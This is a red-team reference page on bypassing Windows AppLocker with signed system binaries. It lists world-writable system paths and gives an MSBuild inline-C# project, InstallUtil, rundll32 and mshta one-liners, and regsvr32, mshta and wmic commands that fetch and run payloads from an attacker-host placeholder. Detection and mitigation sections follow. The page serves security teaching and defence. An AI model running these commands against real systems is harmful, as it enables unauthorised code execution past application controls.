% Filename: 06-red-teaming/evasion/applocker-bypass.md
% Display name: AppLocker Bypass
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1218 (System Binary Proxy Execution)
% Authors: @TristanInSec

# AppLocker Bypass

## Overview

AppLocker is a Windows application control feature that restricts which executables, scripts, DLLs, and installers users can run. It uses rules based on publisher (certificate), path, or file hash. Red teams bypass AppLocker by executing code through trusted Microsoft binaries (LOLBins), writing to allowed paths, or abusing trusted publisher rules. AppLocker is the predecessor to Windows Defender Application Control (WDAC), which is significantly harder to bypass.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1218 - System Binary Proxy Execution

## Techniques

### AppLocker Rule Types

```text
Rule Type       What It Controls                    Bypass Difficulty
──────────────  ──────────────────────────────────  ─────────────────
Executable      .exe, .com                          Medium
Script          .ps1, .bat, .cmd, .vbs, .js         Medium
Win Installer   .msi, .msp, .mst                    Medium
Packaged Apps   Windows Store apps                  Low
DLL             .dll, .ocx                          Hard (rarely enabled)
```

### Default Allow Rules

```text
AppLocker default rules allow:
  - Everything in C:\Windows\*         (Microsoft-signed system files)
  - Everything in C:\Program Files\*   (installed applications)
  - Administrators can run anything

These defaults create bypass opportunities:
  - Writable subdirectories under C:\Windows\
  - Microsoft-signed binaries that can proxy execution
```

### Writable Paths Under Allowed Directories

```bash
# Directories under C:\Windows\ that are world-writable:
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\Tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\spool\PRINTERS\
C:\Windows\System32\spool\SERVERS\
C:\Windows\SysWOW64\Tasks\
C:\Windows\SysWOW64\com\dmp\

# Copy payload to writable path and execute
copy payload.exe C:\Windows\Tasks\payload.exe
C:\Windows\Tasks\payload.exe
```

### MSBuild Bypass

```bash
# MSBuild.exe — Microsoft Build Engine (signed by Microsoft)
# Executes inline C# tasks from XML project files
# Does not trigger AppLocker script rules

# Create a .csproj file with inline C# code:
```

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Execute/>
  </Target>
  <UsingTask TaskName="Execute" TaskFactory="CodeTaskFactory"
        AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class Execute : Task {
          public override bool Execute() {
            // Shellcode loader or reverse shell code here
            System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\Windows\\Tasks\\output.txt");
            return true;
          }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```bash
# Execute:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### InstallUtil Bypass

```bash
# InstallUtil.exe — .NET Installation Utility (signed by Microsoft)
# Loads and executes .NET assemblies via the installer class

# Compile a C# payload with an installer class:
# csc /target:library /out:payload.dll payload.cs

# Execute (bypasses AppLocker):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### Regsvr32 Bypass

```bash
# Regsvr32.exe — register/unregister OLE controls (signed by Microsoft)
# Can load remote scriptlets (.sct files)

# Host a scriptlet on the attacker's web server:
# (scriptlet contains VBScript or JScript code)

regsvr32 /s /n /u /i:http://<attacker_ip>/payload.sct scrobj.dll
```

### MSHTA Bypass

```bash
# mshta.exe — Microsoft HTML Application Host (signed by Microsoft)
# Executes .hta files containing VBScript/JScript

# Execute remote HTA
mshta http://<attacker_ip>/payload.hta

# Execute inline VBScript
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")

# Execute inline JScript
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("cmd /c whoami");close();
```

### Rundll32 Bypass

```bash
# Rundll32.exe — run DLL exports (signed by Microsoft)
# Can execute JavaScript, call COM objects, or load custom DLLs

# Execute JavaScript via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell");h.Run("cmd /c whoami");

# Execute a custom DLL export
rundll32.exe payload.dll,EntryPoint
```

### WMIC Bypass

```bash
# wmic.exe — WMI command-line interface
# Can execute XSL (Extensible Stylesheet Language) files containing JScript

# Create an XSL file with JScript payload:
# Host it on the attacker's web server

wmic os get /format:"http://<attacker_ip>/payload.xsl"
```

### PowerShell Constrained Language Mode Bypass

```powershell
# When AppLocker is enforced, PowerShell enters Constrained Language Mode (CLM)
# CLM restricts: Add-Type, .NET reflection, COM objects, arbitrary method invocation

# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass options:
# 1. Use PowerShell from a trusted path (C:\Windows\*)
# 2. Use MSBuild/InstallUtil to run C# code instead
# 3. Use Custom Runspace (requires C# loader already running)
# 4. PowerShell v2 (if available) does not enforce CLM
```

## Detection Methods

### Host-Based Detection

- AppLocker event logs (Microsoft-Windows-AppLocker/EXE and DLL, MSI and Script)
- Event ID 8003 (audit mode — would have been blocked) and 8004 (blocked by enforcement)
- Monitoring for execution of known LOLBins with unusual arguments
- MSBuild.exe loading user-created .csproj files
- regsvr32.exe making outbound HTTP connections

### Logging

- Enable AppLocker in Audit mode first to understand baseline
- Windows Event IDs: 8001-8004 (AppLocker), 4688 (Process Creation with command line)

## Mitigation Strategies

- **Migrate to WDAC** — Windows Defender Application Control is significantly harder to bypass
- **Enable DLL rules** — block untrusted DLLs (disabled by default, performance impact)
- **Block LOLBin abuse** — add deny rules for MSBuild, InstallUtil, etc. from user-writable paths
- **Restrict writable paths** — remove write permissions from C:\Windows\ subdirectories
- **Script enforcement** — constrained language mode + Script Block Logging

## References

### MITRE ATT&CK

- [T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
